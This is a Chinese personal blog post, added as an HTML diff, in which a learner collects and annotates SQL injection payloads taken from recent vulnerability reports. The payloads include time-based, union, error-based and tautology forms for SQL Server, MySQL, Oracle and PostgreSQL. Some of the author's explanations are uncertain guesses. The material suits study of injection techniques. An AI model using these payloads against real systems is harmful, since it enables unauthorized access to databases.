@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>sql语句积累 · 随波逐流の旅店</title>
+<style>:root{--ink:#eaf3ff;--muted:#a9c3dd;--line:rgba(255,255,255,.2);--sky:#3aa3e3;--gold:#e0a545}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0}
+body{min-height:100vh;color:var(--ink);font:16px/1.85 "PingFang SC","Microsoft YaHei",system-ui,-apple-system,sans-serif;background:#0d2137 url('/SAO-bg.jpg') center/cover fixed no-repeat}
+body::before{content:'';position:fixed;inset:0;background:rgba(8,20,36,.7);z-index:-1}
+.pill{display:inline-flex;align-items:center;gap:8px;padding:7px 16px;border-radius:999px;background:rgba(226,236,248,.16);border:1px solid var(--line);color:#fff;text-decoration:none;font-size:14px;backdrop-filter:blur(12px);transition:.3s}
+.pill:hover{background:rgba(58,163,227,.5)}
+.wrap{max-width:860px;margin:0 auto;padding:44px 22px 80px}
+.panel{margin-top:18px;background:rgba(12,26,44,.62);border:1px solid var(--line);border-radius:20px;padding:34px 36px;backdrop-filter:blur(18px) saturate(140%);box-shadow:0 20px 50px rgba(5,16,30,.4)}
+h1{margin:0 0 14px;font-size:29px;line-height:1.4;color:#fff}
+.meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:24px;padding-bottom:18px;border-bottom:1px dashed var(--line)}
+.chip{padding:2px 11px;border-radius:999px;background:rgba(255,255,255,.12);border:1px solid var(--line);font-size:12px;color:var(--muted)}
+.chip.date{color:var(--gold)}
+article h2,article h3,article h4{color:#fff;margin:1.6em 0 .6em;line-height:1.45}
+article h2{font-size:23px;border-left:3px solid var(--sky);padding-left:12px}
+article h3{font-size:19px;color:#dcecff}
+article p{margin:.85em 0}
+article a{color:#8fd0ff}
+article img{max-width:100%;border-radius:10px;margin:14px 0}
+article ul,article ol{padding-left:1.5em}
+article li{margin:.35em 0}
+article blockquote{margin:1.2em 0;padding:10px 18px;border-left:3px solid var(--sky);background:rgba(255,255,255,.07);border-radius:0 10px 10px 0;color:var(--muted)}
+article code{background:rgba(255,255,255,.14);padding:2px 6px;border-radius:5px;font-size:.9em;color:#ffd9a8;font-family:Consolas,Monaco,monospace}
+article pre{background:rgba(6,14,26,.85);border:1px solid var(--line);border-radius:12px;padding:16px 18px;overflow:auto;margin:1.2em 0}
+article pre code{background:none;padding:0;color:#d6e6f7;font-size:13.5px;line-height:1.7}
+article table{width:100%;border-collapse:collapse;margin:1.2em 0;font-size:14px}
+article th,article td{border:1px solid var(--line);padding:8px 12px;text-align:left}
+article th{background:rgba(255,255,255,.07);color:#fff}
+article hr{border:none;border-top:1px dashed var(--line);margin:2em 0}
+.img-fallback{display:block;padding:18px;margin:14px 0;border:1px dashed var(--line);border-radius:10px;background:rgba(255,255,255,.05);color:var(--muted);font-size:13px;text-align:center}
+@media(max-width:640px){.panel{padding:22px 18px}.wrap{padding:24px 14px 60px}h1{font-size:22px}}</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="pill" href="/article-list/">← 返回归档</a> <a class="pill" href="/">⌂ 主页</a>
+  <div class="panel">
+    <h1>sql语句积累</h1>
+    <div class="meta"><span class="chip date">2024-08-25</span><span class="chip">分类·工具</span><span class="chip">#工具</span></div>
+    <article><p>昨天刚重修完基本的sql注入的，今天看了看2023-2024的一些暴出来的sql漏洞，学习一下师傅们的注入手法，积累一下注入语句🤭</p>
+<p>-- 真的，不看不知道，一看真的是惊讶于师傅们的手法，真的，一个永真都玩出花了，果然我就是一个菜鸡
+<del>确信.jpg</del></p>
+<h1>Sql Server</h1>
+<pre><code class="language-WAITFOR">1&#39; WAITFOR DELAY &#39;0:0:5&#39;--
+waitfor 有两种用法
+waitfor time  &#39;10:01:01&#39;指定10点1分2秒时执行
+waitfor delay &#39;01:02:03&#39;指定等待1小时2分钟3秒后执行
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/66cbd054d9c307b7e9d65a0b.png" alt=""></p>
+<p>像是这个，就是一个延时注入的</p>
+<h1>MySql</h1>
+<pre><code class="language-union">union all
+
+
+1&#39; UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NUL
+
+union all联合注入，需要注意的是munion all操作用于结合两个或更多 SELECT 语句的结果集，包括所有匹配的行，甚至包括重复的行，但是union会默认删除重复的行
+</code></pre>
+<pre><code class="language-联合注入">联合注入
+
+联合注入亦可以进行这样的
+action=GetDetail&amp;status=300&amp;id=1+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%2885%29%2BCHAR%28122%29%2BCHAR%2883%29%2BCHAR%28113%29%2BCHAR%2890%29%2BCHAR%28120%29%2BCHAR%2888%29%2BCHAR%28103%29%2BCHAR%2886%29%2BCHAR%28122%29%2BCHAR%2876%29%2BCHAR%2881%29%2BCHAR%2868%29%2BCHAR%2871%29%2BCHAR%2866%29%2BCHAR%28104%29%2BCHAR%2872%29%2BCHAR%28117%29%2BCHAR%2890%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28117%29%2BCHAR%28105%29%2BCHAR%2865%29%2BCHAR%28100%29%2BCHAR%28111%29%2BCHAR%28118%29%2BCHAR%28119%29%2BCHAR%28119%29%2BCHAR%28119%29%2BCHAR%28111%29%2BCHAR%2877%29%2BCHAR%2890%29%2BCHAR%28105%29%2BCHAR%28103%29%2BCHAR%28111%29%2BCHAR%2880%29%2BCHAR%28106%29%2BCHAR%2869%29%2BCHAR%2887%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+BUHl
+
+中间的经过url解码以后就是
+action=GetDetail&amp;status=300&amp;id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,CHAR(113)+CHAR(112)+CHAR(122)+CHAR(122)+CHAR(113)+CHAR(85)+CHAR(122)+CHAR(83)+CHAR(113)+CHAR(90)+CHAR(120)+CHAR(88)+CHAR(103)+CHAR(86)+CHAR(122)+CHAR(76)+CHAR(81)+CHAR(68)+CHAR(71)+CHAR(66)+CHAR(104)+CHAR(72)+CHAR(117)+CHAR(90)+CHAR(112)+CHAR(106)+CHAR(117)+CHAR(105)+CHAR(65)+CHAR(100)+CHAR(111)+CHAR(118)+CHAR(119)+CHAR(119)+CHAR(119)+CHAR(111)+CHAR(77)+CHAR(90)+CHAR(105)+CHAR(103)+CHAR(111)+CHAR(80)+CHAR(106)+CHAR(69)+CHAR(87)+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(122)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL--+BUHl
+
+提取char就是qpzzqUzSqZxXgVzLQDGBhHuZpjuiAdovwwwoMZigoPjEWqjkzq，这样绕过了对qpzzqUzSqZxXgVzLQDGBhHuZpjuiAdovwwwoMZigoPjEWqjkzq的限制
+</code></pre>
+<pre><code class="language-永真">永真
+
+1 OR 3*2*1=6 AND 000322=000322&amp;order=desc&amp;request=watch&amp;sort=Id&amp;view=request
+这个我猜测可能是因为限制了1=1这个，随意当初打出来的师傅才进行了or 3*2*1=6 and 000322=000322
+
+2&#39; AND 6205=DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(66)||CHR(90)||CHR(108),8)--
+2&#39;：在 SQL 查询中，这个部分可能是用来闭合之前的字符串或条件。
+AND 6205=DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(66)||CHR(90)||CHR(108),8)：在这里，通过构造一个条件，尝试调用 DBMS_PIPE.RECEIVE_MESSAGE 函数。这个函数用于从管道中接收消息，参数是一个由字符值拼接而成的字符串。
+CHR(98)||CHR(66)||CHR(90)||CHR(108)：这部分是 Oracle SQL 中用来生成字符的函数，将字符的 ASCII 值转换为字符本身。在这里，拼接的字符可能是 &quot;bBZl&quot;。
+
+&#39;and 1=user::integer--
+1=user::integer 可能是尝试将一个整数等于另一个整数，这里是 1 等于用户 user 的整数值。
+
+1&#39;,&#39;10&#39;,(select+@`,&#39;`+or+if(1=0,1,(select+~0+1))+limit+0,1))--+&#39;
+
+&#39;1&#39;,&#39;10&#39;,(select @&#39;,&#39;：在这里，逗号可能用于分隔不同字段或参数。&#39;1&#39; 可能是用来闭合之前的字符串，&#39;10&#39; 可能是一个参数。
++or+if(1=0,1,(select ~0+1))+limit+0,1))--+&#39;：这是尝试执行 SQL 注入攻击的关键部分：
++or+if(1=0,1,(select ~0+1))：构造一个条件，如果 1 等于 0，则返回 1，否则执行 select ~0+1，可能是为了检测条件是否成立。
+limit 0,1：在某些数据库中，LIMIT 语句用于限制结果集的返回行数。
+--+&#39;：注释掉后续语句，确保注入部分不会破坏整个查询。
+</code></pre>
+<pre><code class="language-延时">延时
+
+AND (SELECT 4802 FROM (SELECT(SLEEP(5)))ndMq) AND &#39;NEoX&#39;=&#39;NEoX
+我有点疑惑这个为啥要嵌套一个，是为了让里面的select (sleep(5))先执行吗？
+
+ &quot;&#39;XOR(if(now()=sysdate(),sleep(5),0))XOR&#39;&quot;
+里面好像是做了一个判断，检查当前时间是否等于系统日期，如果相等，则执行 sleep(5)，即让查询暂停 5 秒钟，否则返回 0
+
+?do=getList&amp;lsid=%28SELECT+%28CASE+WHEN+%289765%3D9765%29+THEN+%27%27+ELSE+%28SELECT+7700+UNION+SELECT+3389%29+END%29%29 HTTP/1.1
+
+我在里面还看到了这么一个的，就是一个条件判断语句 CASE WHEN (9765=9765) THEN &#39;&#39; ELSE (SELECT 7700 UNION SELECT 3389) END：在这里，根据条件判断，如果 9765 等于 9765，则返回空字符串，否则返回一个联合查询结果集 (7700) UNION (3389)。
+
+(SELECT 4655 FROM (SELECT(SLEEP(5)))usQE
+
+4655：在这个语句中，4655 只是一个随机的数字，通常用作测试载荷，没有实际意义，只是用于检查应用程序是否执行了预期的操作或是否存在漏洞。
+SLEEP(5)：SLEEP(5) 是一个 MySQL 的函数，会使查询暂停执行 5 秒钟。在这里，它被用作一个时间延迟函数，用来测试应用程序对时间延迟攻击（基于时间的盲注）的防护性能。
+usQE：usQE 可能只是一个命名，没有特定含义，主要是作为查询的别名或标识符使用。
+</code></pre>
+<pre><code class="language-MD5">MD5
+
+action=detailInfo&amp;fileid=1+and+%01(select+SUBSTRING(sys.fn_sqlvarbasetostr(HASHBYTES(&#39;MD5&#39;,&#39;123&#39;)),3,32))&lt;0--
+
+这段代码的目的是：
+
+通过 HASHBYTES(&#39;MD5&#39;,&#39;123&#39;) 对字符串 &#39;123&#39; 进行 MD5 哈希处理。
+正常来说,hash转换以后是一串16进制数字，这里用sys.fn_sqlvarbasetostr将哈希后的结果转换为字符串。
+使用 SUBSTRING 函数从第三个字符开始提取长度为 32 的子字符串。
+最后，尝试执行一个逻辑比较，判断提取的子字符串是否小于 0。
+</code></pre>
+<pre><code class="language-报错">报错
+
+?updatexml(1,concat(0x7e,user(),0x7e),1)=1
+正统报错注入，所以这个是师傅updatexml=1是吗
+
+1%20and%20updatexml(1,concat(0x7e,version(),0x7e),1)
+
+好吧这才是正统的
+
+url解码
+1 and updatexml(1,concat(0x7e,version(),0x7e),1)
+
+
+updatexml(1,concat(0x5c,md5(123456),0x5c),1) 这部分代码尝试将目标节点的内容设置为 &#39;\md5(123456)\&#39;
+concat连接
+0x5c解码\，就是把1替换成\md5(123456)\
+</code></pre>
+<h1>PostgreSql</h1>
+<pre><code class="language-PG_SLEEP">PG_SLEEP
+
+就是mysql中的sleep
+admin&#39;);SELECT PG_SLEEP(5)--
+</code></pre>
+<p>最终也没看完人家的整个漏洞库，看了大概有一半吧，魂飞了，这是里面出现的各种师傅的注入手法，也是挺新奇的，只能说，孩子太菜了还是带学啊</p>
+</article>
+  </div>
+</div><script>
+  // 正文插图兜底：失效图片替换为占位块，避免出现破图
+  document.querySelectorAll('article img').forEach(function (img) {
+    img.loading = 'lazy';
+    img.addEventListener('error', function () {
+      var ph = document.createElement('span');
+      ph.className = 'img-fallback';
+      ph.textContent = '图片已失效 · ' + (img.getAttribute('alt') || '');
+      if (img.parentNode) img.parentNode.replaceChild(ph, img);
+    });
+  });
+</script></body>
+</html>
